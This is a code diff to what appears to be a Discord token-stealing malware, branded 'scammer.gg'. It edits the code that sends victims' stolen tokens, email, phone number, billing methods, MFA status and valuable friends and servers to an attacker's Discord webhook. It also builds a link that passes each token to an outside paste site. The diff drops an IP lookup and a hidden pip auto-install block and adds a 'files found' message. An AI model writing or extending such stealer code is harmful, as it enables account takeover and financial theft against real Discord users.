@@ -204,26 +204,6 @@ class upload_tokens:
 
         return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
 
-    def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
-    return ip
-
-requirements = [
-    ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"]
-]
-for modl in requirements:
-    try: __import__(modl[0])
-    except:
-        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
-        time.sleep(3)
-
-import requests
-from Crypto.Cipher import AES
     
     def upload(self):
         if not self.tokens:
@@ -353,23 +333,26 @@ from Crypto.Cipher import AES
             else:
                 codes = None
 
-            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
+            content = "Arquivos encontrados em: `{path}` "
+            embed = Embed(title=f"{username} ({user_id})", color=3553599)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<:green_tdm_money:987145380854640650> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<:bla_rtx:993770918889398402> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<:bla_rtx:993770918889398402> Nitro-Type:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:995912347262664705:1035883153866358855> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
             embed.add_field(name="<:hoppe12:1031907662604029962> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:979750505607725106:1035881912419483679> IP:", value=f"{getip()}", inline=True)
+            embed.add_field(name="<:979750505607725106:1035881912419483679> MFA:", value=f"{mfa}", inline=True)
             embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.set_footer(text="@scammer.gg")
 
+            self.webhook.send(content=content,username="scammer.gg", avatar_url="https://cdn.discordapp.com/attachments/1051616879610970202/1052682510527647764/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
+
             self.webhook.send(embed=embed, username="scammer.gg", avatar_url="https://cdn.discordapp.com/attachments/1051616879610970202/1052682510527647764/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
 
             
-            HQembed = Embed(title = "<:0_ubpig:974784458504933456> HQ Friends:", color=0x000000)
+            HQembed = Embed(title = "<:0_ubpig:974784458504933456> HQ Friends:", color=3553599)
             if hq_friends != None:
                 embed.add_field(name="",value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
@@ -378,7 +361,7 @@ from Crypto.Cipher import AES
 
             self.webhook.send(embed=HQembed, username="scammer.gg", avatar_url="https://cdn.discordapp.com/attachments/1051616879610970202/1052682510527647764/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
 
-            SVHQembed = Embed(title = "<:0_ubpig:974784458504933456> HQ Guilds:", color=0x000000)
+            SVHQembed = Embed(title = "<:0_ubpig:974784458504933456> HQ Guilds:", color=3553599)
             if hq_guilds != None:
                 embed.add_field(name="", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
